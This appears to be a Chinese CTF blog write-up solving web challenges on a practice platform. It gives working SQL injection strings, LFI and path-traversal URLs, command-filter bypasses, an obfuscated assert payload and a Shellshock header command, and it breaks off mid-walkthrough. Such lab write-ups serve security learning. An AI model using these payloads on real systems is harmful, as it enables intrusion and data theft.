<p>那么开始注入，用联合查询</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image007.jpg" class=""></span></p>
<p><span lang=EN-US>id=1 union select 1,2,3,table_name from information_schema.tables where table_schema=database() </span>得表名</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image008.jpg" class=""></span></p>
<p><span lang=EN-US>1 union select 1,2,3,column_name from information_schema.columns where table_name=”flag” limit 0,1</span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image009.jpg" class=""></span></p>
<p>回显太少感觉不对劲，换一个方式，用<span lang=EN-US>group_concat()</span>将回显拼接并回显。</p>
<p><span lang=EN-US>1 union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=&quot;flag&quot;</span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image010.jpg" class=""></span></p>
<p>这还差不多，最后</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image011.jpg" class=""></span></p>
<p>即为<span lang=EN-US>FLAG</span>。</p>
<h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a><a name="_Toc28387030"><span lang=EN-US style='font-size:15.0pt;line-height:173%;font-family:黑体'>LFI</span></a></h2><p>进入题目随便点点，看到<span lang=EN-US>url</span>有明显的<span lang=EN-US>LFI</span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image012.jpg" class=""></span>又看到源码中有提示</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image013.jpg" class=""></span></p>
<p>尝试用<span lang=EN-US>php://filter</span>进行包含</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image014.jpg" class="">&nbsp;</span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image015.jpg" class=""></span></p>
<p><span lang=EN-US>B64</span>解码为</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image016.jpg" class=""></span></p>
<p>那么我们就去读</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image017.jpg" class="">&nbsp;</span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image018.jpg" class=""></span></p>
<p><span lang=EN-US>B64</span>解码为</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image019.jpg" class=""></span></p>
<p>即可。</p>
<h2 id="homepage"><a href="#homepage" class="headerlink" title="homepage"></a><a name="_Toc28387031"><span lang=EN-US style='font-size:15.0pt;line-height:173%;font-family:黑体'>homepage</span></a></h2><p>啊又回到了主页，东翻西翻，找不到，但是看到有个<span lang=EN-US>cute.js</span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image020.jpg" class=""></span></p>
<p>然后再打开控制台</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image021.jpg" class=""></span></p>
<p>发现了一个二维码，扫一扫即有<span lang=EN-US>flag</span>。</p>
<h2 id="ping"><a href="#ping" class="headerlink" title="ping"></a><a name="_Toc28387032"><span lang=EN-US style='font-size:15.0pt;line-height:173%;font-family:黑体'>ping</span></a></h2><p>看题目就知道是命令执行，看到一堆<span lang=EN-US>blacklist</span>过滤</p>
<p>但是发现他并没有过滤<span lang=EN-US><code></code></span>以及<span lang=EN-US>$()</span></p>
<p>那我们就尝试</p>
<p><span lang=EN-US><code>ls -al</code></span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image022.jpg" class=""></span></p>
<p><span lang=EN-US><code>cat flag.php</code></span>发现<span lang=EN-US>cat</span>和<span lang=EN-US>flag</span>都被过滤。</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image023.jpg" class=""></span></p>
<p>查一查有什么替代指令</p>
<p><span lang=EN-US>Tac</span>：从最后一条开始显示</p>
<p><span lang=EN-US>More</span>：一页一页的显示</p>
<p><span lang=EN-US>Tail</span>：只看末尾几行</p>
<p><span lang=EN-US>nl</span>：显示信息的时候顺序输出行号</p>
<p>随便挑一个吧，选<span lang=EN-US>tail</span>，之后<span lang=EN-US>flag.php</span>可以用通配符<span lang=EN-US>?</span>绕过。</p>
<p>如<span lang=EN-US><code>tail ????.???</code></span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image024.jpg" class=""></span></p>
<h2 id="scoreboard"><a href="#scoreboard" class="headerlink" title="scoreboard"></a><a name="_Toc28387033"><span lang=EN-US style='font-size:15.0pt;line-height:173%;font-family:黑体'>scoreboard</span></a></h2><p>这题在之前找的时候就找到的<span lang=EN-US>flag</span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image025.jpg" class=""></span></p>
<h2 id="Login-as-Admin-0-amp-Login-as-Admin-0-1"><a href="#Login-as-Admin-0-amp-Login-as-Admin-0-1" class="headerlink" title="Login as Admin 0 &amp; Login as Admin 0.1"></a><a name="_Toc28387034"><span lang=EN-US style='font-size:15.0pt;line-height:173%;font-family:黑体'>Login as Admin 0 &amp; Login as Admin 0.1</span></a></h2><p>这两题给出了源代码</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image026.jpg" class=""></span></p>
<p>简要分析之后，确定此题为<span lang=EN-US>sql</span>注入，且根据其中的查询语句，我们可以通过<span lang=EN-US>user</span>构造如下语句：</p>
<p><span lang=EN-US style='color:black'>SELECT&nbsp;*&nbsp;FROM&nbsp;<code>user</code>&nbsp;WHERE&nbsp;<code>user</code>&nbsp;=&nbsp;’%s’or 1=1(</span><span style='color:black'>想执行的语句<span lang=EN-US>)#’&nbsp;AND&nbsp;<code>pa
ssword</code>&nbsp;=&nbsp;’%s’</span></span></p>
<p><span lang=EN-US style='color:black'>#</span><span style='color:black'>号能将密码处给注释掉，一旦我们想查询的语句为真则会执行并返回回显。</span></p>
<p>回头过来看代码结构，发现过滤了<span lang=EN-US>or 1=1</span>、<span lang=EN-US>drop</span>、<span lang=EN-US>uodate</span>、<span lang=EN-US>delete</span>这些关键字还有一个将</p>
<p><span lang=EN-US>&lt;/span&gt;置换为<span lang=EN-US></span>的操作，我们可以用<span lang=EN-US>||</span>代替<span lang=EN-US>or</span>的功能。</p>
<p>尝试下万能密码绕过，</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image027.jpg" class=""></span></p>
<p>但是登陆上去并不是<span lang=EN-US>admin</span>，</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image028.jpg" class=""></span></p>
<p>那么我们再尝试联合注入，<span lang=EN-US>order by</span>之后发现有四列，再看看回显位。</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image029.jpg" class=""></span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image030.jpg" class=""></span></p>
<p>发现回显位为<span lang=EN-US>2</span>而且成功获得了第一个<span lang=EN-US>FLAG</span>。发现提示第二个<span lang=EN-US>FLAG</span>在数据库中。</p>
<p>那么我们继续操作，知道回显位以后，开始爆库</p>
<p><span lang=EN-US>admin’ union select 1,database(),3,4#</span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image031.jpg" class=""></span></p>
<p><span lang=EN-US>admin’ union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema = database() #</span>爆表</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image032.jpg" class=""></span></p>
<p>发现隐藏表，</p>
<p><span lang=EN-US>admin’ union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name = &quot;h1dden_f14g&quot; #</span>爆列</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image033.jpg" class=""></span></p>
<p>最后<span lang=EN-US>admin’ union select 1,the_f14g,3,4 from h1dden_f14g #</span>爆<span lang=EN-US>FLAG</span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image034.jpg" class="">&nbsp;</span></p>
<p>即可。</p>
<h2 id="login-as-admin-1-amp-login-as-admin-1-2"><a href="#login-as-admin-1-amp-login-as-admin-1-2" class="headerlink" title="login_as_admin 1 &amp; login_as_admin 1.2"></a><a name="_Toc28387035"><span lang=EN-US style='font-size:15.0pt;line-height:173%;font-family:黑体'>login_as_admin 1 &amp; login_as_admin 1.2</span></a></h2><p>这两题题代码大致与上一题相同，但是<span lang=EN-US>union select</span>和空格被过滤了。问题不大，空格可以用<span lang=EN-US>/<strong>/</span>代替，因此<span lang=EN-US>union select</span>可以替换成<span lang=E
N-US>union/</strong>/select</span>。</p>
<p>那么我们尝试</p>
<p><span lang=EN-US>admin’/<strong>/union/</strong>/select/**/1,database(),3,4#</span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image035.jpg" class=""></span></p>
<p>成功获得第一个<span lang=EN-US>FLAG</span>，这里又提示<span lang=EN-US>FLAG</span>在数据库里。测试一下回显，发现不能直接通过回显来爆库，因为你不管输入什么都会回显相同的输入字符。</p>
<p>猜测可能是盲注并发现</p>
<p><span lang=EN-US>admin’or(ascii(mid((select/**/database()),1,1))&gt;1)#</span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image036.jpg" class=""></span></p>
<p><span lang=EN-US>admin’or(ascii(mid((select/**/database()),1,1))&lt;1)#</span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image037.jpg" class=""></span></p>
<p>明显是盲注，正确的时候可以成功登录，错误的时候显示<span lang=EN-US>login failed</span></p>
<p>贴上脚本</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image038.jpg" class=""></span></p>
<p>因为估计是台湾的网站，所以请求相应貌似特别慢，脚本也跑的贼慢<span lang=EN-US>…</span></p>
<p>所以结果只贴出一部分（<span lang=EN-US>20</span>分钟跑出来的结果，差点以为脚本写错了）</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image039.jpg" class=""></span></p>
<p>一个小时之后的</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image040.jpg" class=""></span></p>
<p>实在是太久了，就这样附上半条<span lang=EN-US>flag…</span></p>
<h2 id="login-as-admin-3"><a href="#login-as-admin-3" class="headerlink" title="login_as_admin 3"></a><a name="_Toc28387036"><span lang=EN-US style='font-size:15.0pt;line-height:173%;font-family:黑体'>login_as_admin 3</span></a></h2><p>源代码</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image041.jpg" class=""></span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image042.jpg" class=""></span></p>
<p>分析源代码，看到在<span lang=EN-US>name</span>和<span lang=EN-US>password</span>匹配处用了<span lang=EN-US>===</span>，那么在弱类型比较中，<span lang=EN-US>0==</span>几乎可以绕过任何判断。又发现<span la
ng=EN-US>json_decode</span>的参与，以及<span lang=EN-US>sha512</span>。</p>
<p>那么我们先以<span lang=EN-US>guest</span>登录来查看下<span lang=EN-US>cookie</span></p>
<p><span lang=EN-US>&nbsp;</span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image043.jpg" class=""></span></p>
<p>尝试解密<span lang=EN-US>cookie</span>，先写解密代码</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image044.jpg" class=""></span></p>
<p>得到<span lang=EN-US>cookie</span>明文的值，修改之后再加密。这里踩了个坑，因为<span lang=EN-US>sig</span>：“<span lang=EN-US>0</span>”传入的<span lang=EN-US>0</span>为字符型，这个时候无法达到弱类型匹<br>配的效果，因此必须用<span lang=EN-US>sig</span>：<span lang=EN-US>0</span>，并且解码出来的<span lang=EN-US>data[1]</span>为真值才可进行绕过</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image045.jpg" class=""></span></p>
<p>修改<span lang=EN-US>cookie</span>并保</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image046.jpg" class=""></span></p>
<p>保存之后改用<span lang=EN-US>GET</span>方式请求<span lang=EN-US>URL</span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image047.jpg" class=""></span></p>
<p>即可获得<span lang=EN-US>FLAG</span></p>
<h2 id="login-as-admin-4"><a href="#login-as-admin-4" class="headerlink" title="login as admin 4"></a><a name="_Toc28387037"><span lang=EN-US style='font-size:15.0pt;line-height:173%;font-family:黑体'>login as admin 4</span></a></h2><p>分析下源代码</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image048.jpg" class=""></span></p>
<p>很简短，如果<span lang=EN-US>POST</span>的<span lang=EN-US>name</span>值为<span lang=EN-US>admin</span>则开始匹配<span lang=EN-US>password</span>是否等于<span lang=EN-US>$password</span>，不等于就再跳转<br>，意味着我们可以进行抓包来获取跳转之前的界面。抓取<span lang=EN-US>https</span>我们用<span lang=EN-US>curl</span>。</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image049.jpg" class=""></span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image050.jpg" class=""></span></p>
<p>在底下找到了<span lang=EN-US>flag</span>。</p>
<h2 id="login-as-admin-6"><a href="#login-as-admin-6" class="headerlink" title="login as admin 6"></a><a name="_Toc28387038"><span lang=EN-US style='font-size:15.0pt;line-height:173%;font-family:黑体'>login as admin 6</span></a></h2><p>分析源代码</p>
<p><span lang=EN-US>&nbsp;</span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image051.jpg" class=""></span></p>
<p>它需要我们<span lang=EN-US>POST</span>一个<span lang=EN-US>data</span>，<span lang=EN-US>data</span>用<span lang=EN-US>json</span>解码之后满足一个结构条件：<span lang=EN-US>users</span>中的&lt;span lang=EN<br>-US&gt;username=1</span>，而且<span lang=EN-US>users</span>的<span lang=EN-US>username</span>与<span lang=EN-US>password</span>不相等。但是这样写的话最终会使<span lang=EN-US>$user=$username=1</span>没有意<br>义，我们可以需要通过条件并将<span lang=EN-US>user</span>赋值为<span lang=EN-US>admin</span>才有意义。我们可以调整为再<span lang=EN-US>data</span>域内<span lang=EN-US>{$user=$username=&gt;$admin=1</span><br>，且<span lang=EN-US>password=1}</span>，我们写个<span lang=EN-US>PHP</span>的<span lang=EN-US>data</span>结构并编码。</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image052.jpg" class=""></span></p>
<p><span lang=EN-US>POST</span>出来的<span lang=EN-US>json_encode</span>结果</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image053.jpg" class=""></span></p>
<p>即可得到<span lang=EN-US>FLAG</span>。</p>
<h2 id="login-as-admin-7"><a href="#login-as-admin-7" class="headerlink" title="login as admin 7"></a><a name="_Toc28387039"><span lang=EN-US style='font-size:15.0pt;line-height:173%;font-family:黑体'>login as admin 7</span></a></h2><p>分析源代码</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image054.jpg" class=""></span></p>
<p>我们知道<span lang=EN-US>POST</span>的<span lang=EN-US>name</span>要等于<span lang=EN-US>admin</span>，且密码中的<span lang=EN-US>password</span>的<span lang=EN-US>MD5</span>值要<span lang=EN-US>==&lt;/spa<br>n&gt;‘<span lang=EN-US>00000……00000</span>’</p>
<p>这里还是弱类型匹配，利用<span lang=EN-US>0exxxxx=0</span>来进行绕过。可以写个脚本来进行<span lang=EN-US>MD5</span>碰撞或者在线搜一搜（偷懒）</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image055.jpg" class=""></span></p>
<p>随便找个<span lang=EN-US>password=s878926199a</span>，提交<span lang=EN-US>payload</span>：<span lang=EN-US>name=admin&amp;password=s878926199a</span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image056.jpg" class=""></span></p>
<p>即可获得<span lang=EN-US>FLAG</span>。</p>
<h2 id="login-as-admin-8-amp-login-as-admin-8-1"><a href="#login-as-admin-8-amp-login-as-admin-8-1" class="headerlink" title="login as admin 8 &amp; login as admin 8.1"></a><a name="_Toc28387040"><span lang=EN-US style='font-size:15.0pt;line-height:173%;font-family:黑体'>login as admin 8 &amp; login as admin 8.1</span></a></h2><p>分析源代码</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image057.jpg" class=""></span></p>
<p>没啥意义<span lang=EN-US>……</span>有个<span lang=EN-US>session</span></p>
<p>那我们看看<span lang=EN-US>cookie</span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image058.jpg" class=""></span></p>
<p>发现了<span lang=EN-US>login8sha512</span>和<span lang=EN-US>login8cookie</span>这两个参数还有他们的<span lang=EN-US>sha512</span>的值，但是这次他没给我们加密代码，放到网站上去解密，解密不能，要猜。</p>
<p>打开<span lang=EN-US>python</span>试试</p>
<p>加密值为<span lang=EN-US>hex</span>形式，需要<span lang=EN-US>10</span>转<span lang=EN-US>16</span>，而且其中包含了序列化<span lang=EN-US>private</span>以及<span lang=EN-US>protected</span>类产生的<span
 lang=EN-US>%00</span>，我们不能直接将字符串放进函数中，需要先将其显示出来再放入函数加密，此处我们可以用<span lang=EN-US>unquote</span>对其进行转码，但是需要先进行<span lang=EN-US>url</span>编码</p>
<p>于是先将</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image059.jpg" class=""></span></p>
<p>变为</p>
<p><span lang=EN-US>O%3A7%3A%22Session%22%3A6%3A%7Bs%3A14%3A%22%00Session%00debug%22%3Bb%3A0%3Bs%3A19%3A%22%00Session%00debug_dump%22%3Bs%3A9%3A%22index.php%22%3Bs%3A13%3A%22%00Session%00data%22%3Ba%3A2%3A<br>%7Bs%3A8%3A%22password%22%3Bs%3A5%3A%22guest%22%3Bs%3A5%3A%22admin%22%3Bb%3A0%3B%7Ds%3A4%3A%22user%22%3Bs%3A5%3A%22guest%22%3Bs%3A4%3A%22pass%22%3Bs%3A5%3A%22guest%22%3Bs%3A8%3A%22is_admin%22%3Bb%3A0%3B<br>%7D</span></p>
<p>再通过脚本加密，先从不加盐开始</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image060.jpg" class=""></span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image061.jpg" class=""></span></p>
<p>对比一下<span lang=EN-US>cookie</span>中的<span lang=EN-US>sha512</span>值，发现结果一致，说明<span lang=EN-US>sha512</span>无盐加密，而且只加密了一部分值。</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image062.jpg" class=""></span></p>
<p>接下来就简单了</p>
<p>修改<span lang=EN-US>cookie</span>中的<span lang=EN-US>is_admin</span>的值为<span lang=EN-US>1</span>并计算出其<span lang=EN-US>sha512</span>的值</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image063.jpg" class=""></span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image064.jpg" class=""></span></p>
<p>保存并改为<span lang=EN-US>GET</span>提交</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image065.jpg" class=""></span></p>
<p>即可获得第一个<span lang=EN-US>FLAG</span>。</p>
<p>我们查看<span lang=EN-US>cookie</span>的时候还发现了<span lang=EN-US>debug</span>参数，我们用初始<span lang=EN-US>cookie</span>修改一下，点击<span lang=EN-US>logout</span>会建立新<span lang=EN-US>sessio<br>n</span>并保存，以此获得初始<span lang=EN-US>cookie</span>。</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image066.jpg" class=""></span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image067.jpg" class=""></span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image068.jpg" class=""></span></p>
<p><span lang=EN-US>&nbsp;</span></p>
<p>修改<span lang=EN-US>debug</span>为<span lang=EN-US>1</span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image069.jpg" class=""></span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image070.jpg" class=""></span></p>
<p>提交，但是回显了登陆之前的页面。<span lang=EN-US>…?</span></p>
<p>不知道什么问题，于是开始逐个修改<span lang=EN-US>cookie</span>中的参数进行测试，最后修改到<span lang=EN-US>index.php</span>的时候有了结果。</p>
<p>将<span lang=EN-US>index.php</span>改为<span lang=EN-US>config.php</span>，然后修改其长度，要符合序列化的规则。</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image071.jpg" class=""></span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image072.jpg" class=""></span></p>
<p>还发现代码里面有<span lang=EN-US>debug</span>的触发条件<span lang=EN-US>GET /?debug=1</span>，点击提交，查看到源代码以及<span lang=EN-US>FLAG</span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image073.jpg" class=""></span></p>
<h2 id="dafuq-manager-1-amp-2-amp-3"><a href="#dafuq-manager-1-amp-2-amp-3" class="headerlink" title="dafuq-manager 1 &amp; 2 &amp; 3"></a><a name="_Toc28387041"><span lang=EN-US style='font-size:15.0pt;line-height:173%;font-family:黑体'>dafuq-manager 1 &amp; 2 &amp; 3</span></a></h2><p>这三题都是连起来的，统一写<span lang=EN-US>wp</span>了。</p>
<p>以<span lang=EN-US>guest</span>登录发现好多提示，先点开</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image074.jpg" class=""></span></p>
<p>发现第一个提示</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image075.jpg" class=""></span></p>
<p>再看<span lang=EN-US>cookie</span>发现了一个<span lang=EN-US>show_hidden</span>参数被置<span lang=EN-US>no</span>了。我们照提示改一改。</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image076.jpg" class=""></span></p>
<p>提交后发现</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image077.jpg" class=""></span></p>
<p>找到了第一题的<span lang=EN-US>flag</span>以及第二题的提示。</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image078.jpg" class=""></span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image079.jpg" class="">&nbsp;</span></p>
<p>要以<span lang=EN-US>admin</span>登录，才可获取第二个<span lang=EN-US>flag</span>。</p>
<p>继续查看还有什么文件，发现了源代码包，下载下来。开始了漫长的代码审计。</p>
<p>看了看<span lang=EN-US>.config</span>发现登陆时获取的信息来自于<span lang=EN-US>.htusers.php</span>，然后与我们提交的用户名和密码进行比对，如果用户名存在、密码相等且存放的<span lang=EN-US>$GLOBALS[&quot;users&quot;][$i][7]</span>为<span lang=EN-US>1</span>，就登录成功。因为数据存储在文件里，所以我们就无法进行<span lang=EN-US>SQL</span>注入，虽然密码相等判断用的是<span lang=EN-US>==</span>，但是由于密码会进行<span lang=EN-US>MD5</span>加密的原因，也无法绕过，所以思路还是去到拿到<span lang=EN-US>.htusers</span>文件上去。</p>
<p>首先是下载，发现了许多功能，在<span lang=EN-US>core</span>里，于是我们跟进<span lang=EN-US>core</span>去找<span lang=EN-US>fun</span>。追踪到<span lang=EN-US>fun_down.php</span>，发现<span lang=EN-US>st<br>ristr($abs_item, ‘.php’)</span>，那想要下载<span lang=EN-US>,htusers.php</span>基本是没戏了。然后是读取，搜索<span lang=EN-US>file_get_content,include,require</span>等函数，其中<span lang=EN-US>readfile<br></span>函数在<span lang=EN-US>fun_down.php</span>里面无法使用，而<span lang=EN-US>f</span>可读的<span lang=EN-US>open</span>函数在<span lang=EN-US>lib_zip.php</span>和<span lang=EN-US>fun_edit</span>中<br>有，但是在<span lang=EN-US>lib_zip.php</span>中的那个没有输出所读取到的数据，而<span lang=EN-US>fun_edit.php</span>中的<span lang=EN-US>edit_file</span>方法，这里会将读取的数据输出。</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image080.jpg" class=""></span></p>
<p>我们<span lang=EN-US>guest</span>用户的<span lang=EN-US>permissions</span>为<span lang=EN-US>1</span>，因此第一个判断可以绕过。</p>
<p>然后是<span lang=EN-US>get_show_item</span>，</p>
<p><span lang=EN-US>&nbsp;</span></p>
<p>第一个<span lang=EN-US>if</span>可以将<span lang=EN-US>cookie</span>中的<span lang=EN-US>show_hidden</span>改为<span lang=EN-US>yes</span>绕过，</p>
<p>第三个<span lang=EN-US>if</span>的<span lang=EN-US>$GLOBALS[&quot;show_hidden&quot;]</span>在<span lang=EN-US>.htusers</span>中可以看到，为<span lang=EN-US>0</span>，所以<span lang=EN-US>dir</span>中不<br>能含有<span lang=EN-US>/.</span>，不过<span lang=EN-US>item</span>就没有这个限制了，我们可以将<span lang=EN-US>../../</span>这些写在<span lang=EN-US>item</span>里来绕过。</p>
<p>我们可以构造<span lang=EN-US>?action=edit&amp;item=../../.config/.htusers.php&amp;dir=</span>然后修改<span lang=EN-US>cookie</span>的<span lang=EN-US>hidden</span>值来进行文件读取。</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image081.jpg" class=""></span></p>
<p>读到文件，口令需要解密。</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image082.jpg" class=""></span></p>
<p>明文值为<span lang=EN-US>how do you turn this on</span>,解密居然要钱…</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image083.jpg" class=""></span></p>
<p>看到<span lang=EN-US>flag2</span>以及<span lang=EN-US>flag3</span>的提示</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image084.jpg" class=""></span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image085.jpg" class=""></span></p>
<p>我们看到了有个后门，翻翻代码，在<span lang=EN-US>fun_debug</span>处看到了<span lang=EN-US>cmd</span>参数可用，但是有过滤和加密。</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image086.jpg" class=""></span></p>
<p>首先<span lang=EN-US>secret_key</span>在之前翻代码的时候已经看到了，还以为是密码，没想到在这里用了。</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image087.jpg" class=""></span></p>
<p>根据<span lang=EN-US>make_command</span>的构造逻辑，我们可以直接尝试进行命令构造，首先过滤操作我们可以用变量拼接的方法来绕过，剩下的过程我们可以直接<span lang=EN-US>copy</span>源码的方法来使用。代码如下<br>：</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image088.jpg" class=""></span>先给命令<span lang=EN-US>b64</span>编码</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image089.jpg" class=""></span></p>
<p>构造</p>
<p><span lang=EN-US>?action=debug&amp;dir[]=&amp;command=JGE9J2Fzcyc7JGI9J2VydCc7JGM9JGEuJGI7JGMoYmFzZTY0X2RlY29kZSgnYzNsemRHVnRLQ2RzY3lBdFlXd25LUT09JykpOw==.d0fb393901cf461c132fd32e0f818d5aa3833d3a9732f35<br>df70204f3e027328f</span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image090.jpg" class=""></span></p>
<p>看到<span lang=EN-US>flag3</span>，读取的时候发现没有权限？还在当前目录看到了<span lang=EN-US>meow</span>文件，百度了一下发现好像没什么用，但是查看大佬的<span lang=EN-US>wp</span>发现这东西可以读文件，<br>那我们构造如下：</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image091.jpg" class=""> <img src="/2020/02/04/First/image092.jpg" class=""></span></p>
<p>提交即可看到<span lang=EN-US>flag</span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image093.jpg" class=""></span></p>
<h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a><a name="_Toc28387042"><span lang=EN-US style='font-size:15.0pt;line-height:173%;font-family:黑体'>webshell</span></a></h2><p>打开网页一片空白，<span lang=EN-US>F12</span>发现一堆奇怪的东西</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image094.jpg" class=""></span></p>
<p>搜索了一下发现是<span lang=EN-US>gzinflate</span>加上<span lang=EN-US>base64</span>编码以及<span lang=EN-US>rot13</span>的加密，解一下密，可以看到如下：</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image095.jpg" class=""></span></p>
<p>给了源代码，看了一下发现逻辑很简单，只要绕过</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image096.jpg" class=""></span>即可执行命令，要用到<span lang=EN-US>vps</span>，在<span lang=EN-US>vps</span>上放个对应的如下类似的<span lang=EN-US>php</span>代码即可。</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image097.jpg" class=""></span></p>
<p>发送<span lang=EN-US>payload</span>，看到有两个<span lang=EN-US>flag</span>？</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image098.jpg" class=""></span></p>
<p>最后发现<span lang=EN-US>.htflag</span>才是正确的<span lang=EN-US>flag</span>。</p>
<h2 id="command-executor"><a href="#command-executor" class="headerlink" title="command-executor"></a><a name="_Toc28387043"><span lang=EN-US style='font-size:15.0pt;line-height:173%;font-family:黑体'>command-executor</span></a></h2><p>这题涉及到一个漏洞，我反正是完全的不懂<span lang=EN-US>…</span>上网看了<span
lang=EN-US>wp</span>之后才知道。叫做破壳漏洞。</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image099.jpg" class=""></span></p>
<p>首先有个文件包含漏洞，<span lang=EN-US>php://filter/read/base64-encode/resource=index</span>读一下文件</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image100.jpg" class=""></span>有<span lang=EN-US>waf</span>，而且读不到<span lang=EN-US>flag</span>，但是有个没见过的函数，<span lang=EN-US>putenv</span><br>。</p>
<p>这个函数有个漏洞，利用方法如上。</p>
<p>我们按照其方法，在<span lang=EN-US>HTTP</span>头中加入<span lang=EN-US>() { : ; }; echo kt</span></p>
<p>但是<span lang=EN-US>waf</span>中貌似过滤这些符号，我们可以用空格进行绕过，对<span lang=EN-US>flag</span>的过滤可以用通配符？绕过。</p>
<p>用<span lang=EN-US>wget –header=&quot;X-Exploit: () { : ; }; echo Hacked&quot; -q -O - &quot;<a href="https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env" target="_blank" rel="noopener">https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env</a>&quot;</span></p>
<p><span lang=EN-US>&nbsp;</span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image101.jpg" class=""></span></p>
<p>发现可以执行指令，我们可以读文件，尝试<span lang=EN-US>ls</span>但是发现不行。</p>
<p>看看网站，又发现<span lang=EN-US>Lists files</span>处可以遍历目录，修改路径可以看到</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image102.jpg" class=""></span></p>
<p><span lang=EN-US>Flag</span>只有<span lang=EN-US>root</span>能读，但是有个<span lang=EN-US>flag-reader</span>，看看他的<span lang=EN-US>C</span>文件。</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image103.jpg" class=""></span></p>
<p>看了一下，随机产生<span lang=EN-US>16</span>个数字，然后再输入回去，就会把<span lang=EN-US>flag</span>写进文件中，但是注意到有个<span lang=EN-US>alarm</span>，要求这个过程小于一秒。</p>
<p>这种类类似猜数的游戏，人肯定玩不过电脑，我们肯定得用脚本或者命令行，我们可以采用文件达成目标。</p>
<p>构造如下：</p>
